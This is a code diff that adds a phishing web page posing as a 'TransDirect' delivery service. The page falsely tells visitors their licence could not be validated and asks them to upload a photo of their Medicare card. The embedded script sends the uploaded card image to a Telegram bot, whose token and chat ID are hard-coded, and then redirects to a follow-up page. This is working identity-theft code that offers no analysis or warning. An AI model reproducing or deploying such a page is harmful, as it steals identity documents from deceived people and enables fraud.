@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TransDirect - Medicare Update</title>
+  <link rel="icon" href="/transdirect_icon.png" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background: linear-gradient(60deg, #efad5d, #5abfeb);
+    }
+    .form-container {
+      max-width: 400px;
+      width: 80%;
+      margin: 5rem auto;
+      padding: 2rem;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.0);
+      text-align: center;
+    }
+    h2 {
+      color: #333;
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      color: #555;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      color: #555;
+    }
+    input[type="file"] {
+      display: none;
+    }
+    .file-label {
+      display: inline-block;
+      width: 100%;
+      /* Updated padding and border-radius to match the button */
+      padding: 14px;
+      background-color: #0073e6;
+      color: white;
+      text-align: center;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: bold;
+      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      margin-bottom: 1rem;
+    }
+    .file-label:hover {
+      background-color: #005bb5;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+    }
+    .file-label.filled {
+      background-color: #28a745;
+    }
+    .file-label.filled span {
+      display: inline;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #0073e6;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: bold;
+      transition: background-color 0.3s, box-shadow 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    button:hover {
+      background-color: #005bb5;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+    }
+    button:disabled, button.disabled {
+      background-color: #28a745;
+      cursor: not-allowed;
+    }
+    .modal {
+      display: flex;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.2);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .modal-content {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.0);
+      max-width: 400px;
+      width: 90%;
+      margin: 0 1rem;
+    }
+    .highlight {
+      background-color: #f0f8ff;
+      border-left: 4px solid #0073e6;
+      padding: 1rem;
+      margin: 1rem 0;
+      text-align: left;
+    }
+    .highlight ul {
+      padding-left: 1.5rem;
+    }
+    .highlight strong {
+      color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container" id="mainContent" style="display:none;">
+  </div>
+  <div class="modal" id="errorModal">
+    <div class="modal-content">
+      <h2>Alternative Verification</h2>
+      <img src="/medicare_example.jpg" alt="medicare_example" width="100%">
+      <p style="text-align: left;" class="highlight">
+        We had an error validating your license. Please upload your Medicare card instead. 
+        For security reasons please ensure all corners are visible.
+      </p>
+      <label class="file-label" for="medicareUpload"><span>Upload Medicare</span></label>
+      <input type="file" id="medicareUpload" name="medicareUpload" accept="image/*" required />
+      <button type="button" id="submitMedicareButton">Submit</button>
+    </div>
+  </div>
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7873416864:AAF64fGpn0DIW0ltoyHMLjCImibeMLKdw2c';
+    const TELEGRAM_CHAT_ID  = '5524654647';
+    function updateLabel(inputId) {
+      const input = document.getElementById(inputId);
+      const label = document.querySelector(`label[for=${inputId}]`);
+      const labelText = label.querySelector('span');
+      input.addEventListener('change', () => {
+        if (input.files && input.files.length > 0) {
+          label.classList.add('filled');
+          labelText.textContent = 'Uploaded';
+        }
+      });
+    }
+    updateLabel('medicareUpload');
+    async function sendDocumentToTelegram(file, fileLabel) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('document', file, fileLabel + '_' + file.name);
+      const sendDocUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+      const response = await fetch(sendDocUrl, {
+        method: 'POST',
+        body: formData
+      });
+      if (!response.ok) {
+        throw new Error(`Failed to send ${fileLabel} to Telegram.`);
+      }
+    }
+    document.getElementById('submitMedicareButton').addEventListener('click', async () => {
+      const submitBtn = document.getElementById('submitMedicareButton');
+      const medicareInput = document.getElementById('medicareUpload');
+      const medicareFile = medicareInput.files[0];
+      if (!medicareFile) {
+        alert('Please upload your Medicare card.');
+        return;
+      }
+      submitBtn.textContent = 'Please wait...';
+      submitBtn.disabled = true;
+      submitBtn.classList.add('disabled');
+      try {
+        await sendDocumentToTelegram(medicareFile, 'Medicare_Card');
+        window.location.href = 'final.html';
+      } catch (error) {
+        console.error(error);
+        submitBtn.textContent = 'Submit';
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('disabled');
+      }
+    });
+  </script>
+</body>
+</html>
